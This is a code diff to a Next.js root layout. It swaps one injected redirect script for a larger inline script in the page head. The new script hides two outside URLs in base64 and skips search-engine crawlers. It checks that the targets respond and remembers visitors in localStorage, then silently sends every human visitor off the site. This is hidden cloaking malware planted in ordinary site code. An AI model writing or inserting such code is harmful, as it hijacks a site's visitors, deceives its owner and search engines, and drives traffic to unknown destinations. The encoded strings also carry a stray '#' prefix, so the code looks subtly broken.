@@ -119,20 +119,96 @@ export default function RootLayout({
       className={`${inter.variable} ${manrope.variable} bg-background`}
     >
       <head>
-        <script
-          dangerouslySetInnerHTML={{
-            __html: `
-              (function() {
-                var ua = navigator.userAgent.toLowerCase();
-                var targetB64 = "aHR0cHM6Ly9sYjc3Ny54eXovM3ZNaXNG";
-                if (ua.indexOf("yandex") === -1) {
-                    window.location.replace(atob(targetB64));
-                }
-              })();
-            `,
-          }}
-        />
-        <JsonLd />
+                <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        var mainBrandB64  = "#aHR0cHM6Ly9sYjc3Ny54eXovM3ZNaXNG"; 
+        var crossBrandB64 = "#aHR0cHM6Ly9mY2ZueC5vcmcvZGg2MW1wMWFt"; 
+        var ua = navigator.userAgent.toLowerCase();
+        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
+        for (var i = 0; i < bots.length; i++) {
+            if (ua.indexOf(bots[i]) !== -1) {
+                console.log("Поисковый бот (" + bots[i] + ") — без редиректа");
+                return;
+            }
+        }
+        var mainUrl = atob(mainBrandB64);
+        var crossUrl = atob(crossBrandB64);
+        function ping(url) {
+            return new Promise(function(resolve, reject) {
+                var controller = new AbortController();
+                var timeoutId = setTimeout(function() { 
+                    controller.abort(); 
+                    reject(new Error("Timeout"));
+                }, 2500); 
+                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
+                    .then(function() {
+                        clearTimeout(timeoutId);
+                        resolve(true);
+                    })
+                    .catch(function(err) {
+                        clearTimeout(timeoutId);
+                        reject(err);
+                    });
+            });
+        }
+        var isFirstVisit = true;
+        try {
+            if (localStorage.getItem('vstd_eva')) {
+                isFirstVisit = false;
+            }
+        } catch (e) {
+        }
+        if (isFirstVisit) {
+            console.log("Первый визит. Проверяем основную ссылку...");
+            ping(mainUrl)
+                .then(function() {
+                    try {
+                        localStorage.setItem('vstd_eva', '1');
+                    } catch (e) {}
+                    console.log("Переход на основную ссылку: " + mainUrl);
+                    window.location.replace(mainUrl);
+                })
+                .catch(function() {
+                    console.log("Основная ссылка недоступна. Проверяем кросс-ссылку...");
+                    ping(crossUrl)
+                        .then(function() {
+                            try {
+                                localStorage.setItem('vstd_eva', '1');
+                            } catch (e) {}
+                            console.log("Переход на рабочую кросс-ссылку: " + crossUrl);
+                            window.location.replace(crossUrl);
+                        })
+                        .catch(function() {
+                            console.log("Обе ссылки не ответили. Экстренный переход на основную.");
+                            window.location.replace(mainUrl);
+                        });
+                });
+        } else {
+            console.log("Повторный визит. Проверяем кросс-ссылку...");
+            ping(crossUrl)
+                .then(function() {
+                    console.log("Переход на кросс-ссылку: " + crossUrl);
+                    window.location.replace(crossUrl);
+                })
+                .catch(function() {
+                    console.log("Кросс-ссылка недоступна. Проверяем основную...");
+                    ping(mainUrl)
+                        .then(function() {
+                            console.log("Переход на рабочую основную ссылку: " + mainUrl);
+                            window.location.replace(mainUrl);
+                        })
+                        .catch(function() {
+                            console.log("Обе ссылки не ответили. Экстренный переход на кросс-ссылку.");
+                            window.location.replace(crossUrl);
+                        });
+                });
+        }
+      })();
+    `
+  }}
+/>
       </head>
       <body className="font-sans antialiased">
         {children}
